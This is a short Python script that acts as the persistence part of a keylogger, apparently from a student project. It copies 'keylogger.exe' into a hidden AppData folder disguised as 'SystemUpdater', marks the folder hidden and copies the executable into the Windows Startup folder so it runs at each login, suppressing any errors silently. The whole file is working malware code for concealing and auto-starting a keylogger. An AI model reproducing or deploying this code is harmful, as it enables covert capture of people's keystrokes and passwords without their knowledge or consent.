import os
import shutil
import ctypes

def hide_folder(folder_path):
    FILE_ATTRIBUTE_HIDDEN = 0x02
    try:
        ctypes.windll.kernel32.SetFileAttributesW(folder_path, FILE_ATTRIBUTE_HIDDEN)
    except:
        pass  

def create_hidden_backup(exe_path):
    hidden_folder = os.path.join(os.getenv("APPDATA"), "SystemUpdater")
    os.makedirs(hidden_folder, exist_ok=True)
    hide_folder(hidden_folder)  
    
    backup_exe_path = os.path.join(hidden_folder, os.path.basename(exe_path))
    try:
        shutil.copyfile(exe_path, backup_exe_path)
    except:
        return None  
    
    return backup_exe_path

def add_to_startup_folder(exe_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    
    if not os.path.exists(startup_folder):
        return  

    shortcut_path = os.path.join(startup_folder, os.path.basename(exe_path))
    try:
        shutil.copyfile(exe_path, shortcut_path)
    except:
        pass  

if __name__ == "__main__":
    target_exe = r"C:\ATHARVA\NMIMS\Sem 6\REMA\Project\Python-Keylogger\dist\keylogger.exe"

    backup_path = create_hidden_backup(target_exe)
    
    if backup_path:  
        add_to_startup_folder(backup_path)
